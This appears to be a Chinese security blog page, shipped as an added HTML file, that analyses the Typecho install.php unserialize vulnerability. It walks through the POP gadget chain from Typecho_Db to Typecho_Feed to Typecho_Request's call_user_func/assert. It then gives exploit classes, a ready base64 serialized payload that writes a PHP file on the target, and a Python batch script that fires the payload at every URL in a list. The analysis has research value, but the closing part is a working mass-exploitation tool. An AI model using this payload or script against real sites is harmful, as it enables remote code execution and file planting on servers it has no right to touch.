@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>Typecho 反序列化漏洞分析 - P1g3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content="P1g3">
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="P1g3" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head></html>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">P1g3</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives" class="menu-item-link">Archives</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/friends" class="menu-item-link">Friends</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">Typecho 反序列化漏洞分析</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-11-22</span>
+  </div>
+  <div class="post-content">
+    <p>POP链：install.php→Cookie.php→Db.php→Feed.php→Request.php</p>
+<p>漏洞点：install.php 230-232行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));</span><br><span class="line">Typecho_Cookie::delete(&apos;__typecho_config&apos;);</span><br><span class="line">$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br></pre></td></tr></table></figure>
+<p>这里有一个反序列化操作，我们先看看他反序列化的值是什么。</p>
+<p>跟进get()方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public static function get($key, $default = NULL) </span><br><span class="line">    &#123;</span><br><span class="line">    $key = self::$_prefix . $key; </span><br><span class="line">    $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);  </span><br><span class="line">    return is_array($value) ? $default : $value; </span><br><span class="line">        &#125;</span><br><span class="line">```       </span><br><span class="line"></span><br><span class="line">    $key其实就是_typecho_config，他会先从cookie中招有没有这个cookie，如果没有就从post中找，找到后赋值给$value。</span><br><span class="line">    </span><br><span class="line">    接着是一个判断，判断$value是否是数组，如果是的话就返回NULL，不是就返回$value。</span><br><span class="line"></span><br><span class="line">我们这里既然想控制反序列化的内容，那么肯定不能让他返回NULL，也就是说$value值一定不能是一个数组。</span><br><span class="line"></span><br><span class="line">现在我们知道他反序列化的值是从哪里来的了，这个值会先经过base64解密之后再反序列化然后赋值给$config。</span><br><span class="line"></span><br><span class="line">我们接着往下看，有一个实例化Typecho_Db的操作，并传了两个值，这两个值都与$config有关，所以这两个值都是我们可控的。</span><br><span class="line"></span><br><span class="line">由于实例化类会触发构造函数，我们跟进这个类的构造函数：</span><br></pre></td></tr></table></figure></p>
+<p>public function __construct($adapterName, $prefix = ‘typecho_’)<br>{<br>    /*<em> 获取适配器名称 </em>/<br>     $this-&gt;_adapterName = $adapterName;</p>
+<pre><code>/** 数据库适配器 */
+$adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;  //字符串拼接，触发某个类的ToString()方法
+</code></pre><p><code>`</code><br>这个构造函数传了两个参数，一个是$adapterName,这个就是实例化类的时候传的第一个参数，另外一个不用管，因为有默认值了，我们没必要改。</p>
+<p>然后接着看，下面有一行代码拼接了我们传进来的参数和一个字符串，这里如果我们传进来的是一个类而不是一个字符串，PHP弱类型就会强制把这个类用toString()方法转成字符串。</p>
+<p>所以我们现在虽然到这里还没有危险函数可以利用，但是我们可以沿着这条攻击链往下看，全局搜索使用了toString()方法的类。</p>
+<p>在Typecho_Feed这个类中使用了toString()方法，这段代码太长就不复制下来了，只看关键代码。</p>
+<p>先进入一个判断：<code>if (self::RSS1 == $this-&gt;_type) {}</code>这个判断中的代码没有危险函数或者可以触发下一个攻击链的，所以我们看下一个判断：<code>else if (self::RSS2 == $this-&gt;_type)</code>。</p>
+<p>这个判断中执行的语句有一行代码是这样的：</p>
+<pre><code>$content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL;
+</code></pre><p>如果这里的$item[‘author’]是一个类，那么这条语句就构成了类名-&gt;属性名的结构，如果这个属性不在这个类中，那么就会触发这个类的__get()方法。</p>
+<p>我们先看看$item[‘author’]的值是从哪里来的：</p>
+<pre><code>foreach ($this-&gt;_items as $item) {
+</code></pre><p>这里说明了$item实际上是items数组的一个索引，算是一个二维数组，我们接着看看items这个数组是从哪里来的。</p>
+<pre><code>private $_items = array();
+</code></pre><p>这里的$_items是类中定义的属性，只要是属性，我们就可以控制他的值，所以这里的值我们是可以控的，也就是说item的值我们也是可控的。</p>
+<p>现在明白了之后我们再全局搜索一下有__get()方法的类。</p>
+<p>在Typecho_Requests这个类中有__get()方法。</p>
+<pre><code>public function __get($key)
+{
+    return $this-&gt;get($key); //key为screenName
+}
+</code></pre><p>我们跟进get()方法。</p>
+<pre><code>public function get($key, $default = NULL)
+{
+    switch (true) {
+        case isset($this-&gt;_params[$key]): //$_params是一个数组属性，我们可控
+            $value = $this-&gt;_params[$key]; //到这里跳出循环，$value=$this-&gt;_params[&apos;screenName&apos;];
+            break;
+        case isset(self::$_httpParams[$key]):
+            $value = self::$_httpParams[$key];
+            break;
+        default:
+            $value = $default;
+            break;
+    }
+
+    $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; //判断$value是否不为数组并且长度大于0，如果两个条件都符合$value值就取自己本身
+    return $this-&gt;_applyFilter($value);
+}
+
+实际上就是把$_params[$key]赋值给$value，我们直接看看$_params这个的值是从哪里来的。
+
+private $_params = array();
+</code></pre><p>又是一个类中的变量，所以他的值也是我们可控的，进而$_params[‘screenName’]也是我们可控的，上述代码没有危险函数，跟进一下_applyFilter()方法。</p>
+<pre><code>private function _applyFilter($value)
+{
+    if ($this-&gt;_filter) {  //_filter是一个数组属性，我们可控
+        foreach ($this-&gt;_filter as $filter) {   //$filter可控
+            $value = is_array($value) ? array_map($filter, $value) : //因为$value不是数组，所以这段不执行
+            call_user_func($filter, $value); //$value可控，这里只要$filter=assert $value=phpinfo();即可触发代码执行
+        }
+
+        $this-&gt;_filter = array(); //把_filter重新还原成数组
+    }
+
+    return $value;
+}
+</code></pre><p>到了这里就有危险函数了，因为$value值不是数组，所以不会执行array_map而是执行call_user_func，而这里的_filter又是这个类中的一个数组属性，所以我们也可控。</p>
+<p>到这里就算是审计完了：</p>
+<pre><code>$filter和$value可控，代码可以进到call_user_func这个函数中，就可以造成任意代码执行。
+</code></pre><p>下面来构造EXP：</p>
+<p>从后往前推：我们先构造Typecho_Requests这个类中我们需要的属性：</p>
+<pre><code>这块很简单，因为我们只需要$filter和$value两个属性的值。
+class Typecho_Request{
+private $_params = array(&quot;screenName&quot;=&gt;&quot;file_put_contents(&apos;b.php&apos;,&apos;&lt;?php phpinfo();?&gt;&apos;)&quot;);
+private $_filter = array(&quot;assert&quot;);
+}
+
+这里的$_parms[&apos;screenName&apos;]就相当于$value。
+</code></pre><p>下面我们来构造Typecho_Feed这个类中我们所需要的属性：</p>
+<pre><code>class Typecho_Feed{
+    const RSS2 = &apos;RSS 2.0&apos;;
+    private $_type=&quot;RSS 2.0&quot;;
+    private $_items = array();
+
+    public function __construct()
+    {
+
+        $this-&gt;_items = array(array(&quot;author&quot;=&gt;new Typecho_Request()));
+
+    }
+
+
+}
+
+因为我们需要进入第二个判断，所以需要给$_type赋值为&quot;RSS 2.0&quot;，然后给$_items[&quot;0&quot;]赋值为一个数组，到时候$items[&quot;0&quot;]会通过foreach传给$item。
+</code></pre><p>这两块都写好了，我们只需要传入一个经过序列化后再base64加密的字符串即可。</p>
+<pre><code>$exp = array(&quot;adapter&quot;=&gt;new Typecho_Feed(),&quot;prefix&quot;=&gt;&quot;typecho_&quot;);
+</code></pre><p>后面的那个参数要不要都无所谓，因为已经有默认的了，以防万一我就先加上了。</p>
+<p>因为我们第一个要进行操作的数组是Typecho_Feed，所以这里就给$config[‘adapter’]赋值为一个对象。经过字符串拼接后就会进入这个类的toString()方法。</p>
+<p>生成exp之后试一下：</p>
+<p><img src="http://static.zybuluo.com/Em1or/f3f3v2ppjlzk5dxsjxsm5yvq/QQ%E6%88%AA%E5%9B%BE20181108174612.png" alt="QQ截图20181108174612.png-144.5kB"></p>
+<p>默认返回是500，接下来我们访问一下生成了的文件。</p>
+<p><img src="http://static.zybuluo.com/Em1or/8m9iod2oojfzyz6gkq6jxeod/QQ%E6%88%AA%E5%9B%BE20181108174612.png" alt="QQ截图20181108174612.png-452.9kB"></p>
+<p>可以看到是写入成功了的。</p>
+<p>总结以下这个漏洞利用的条件：</p>
+<p>1.finish值不能为空<br>2.如果想以POST方式发送EXP，cookie中就不能含有__typecho_config字段。<br>3.Refer必须是本站</p>
+<p>由上述三个条件写Python版的批量EXP：</p>
+<pre><code>import requests
+
+urls=open(r&apos;C:\Users\Administrator\Desktop\urls.txt&apos;,mode=&apos;r&apos;)
+
+exp = &quot;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo1NToiZmlsZV9wdXRfY29udGVudHMoJ2V4cGxvaXR0LnBocCcsJzw/cGhwIHBocGluZm8oKTsgPz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=&quot;
+
+data={&apos;__typecho_config&apos;:exp}
+
+
+for url in urls:
+    headers = {
+        &apos;Cookie&apos;: &apos;Phpstorm-cd979afe=596aa2c7-9a8c-4a3c-818f-79f035757f26; PHPSESSID=6o2hdegbuu4b6sknfhk3i1h8k7; __typecho_lang=zh_CN&apos;,
+        &apos;Referer&apos;:url
+
+    }
+
+    url1 = url+&apos;/install.php?finish=4&apos;
+    res = requests.post(url1,data=data,headers=headers)
+    if res.status_code == 500:
+        print(&apos;[+] &apos; + url + &apos;写入成功，写入文件地址为：&apos;+url +  &apos;/exploitt.php&apos;)
+</code></pre><p>复现版本Typecho源码：</p>
+<p>链接: <a href="https://pan.baidu.com/s/1h2yDIvFTsSIJieUFOy-8-Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1h2yDIvFTsSIJieUFOy-8-Q</a> 提取码: tfip </p>
+
+  </div>
+  <div class="post-footer">
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2018
+  <span class="author">
+    P1g3
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
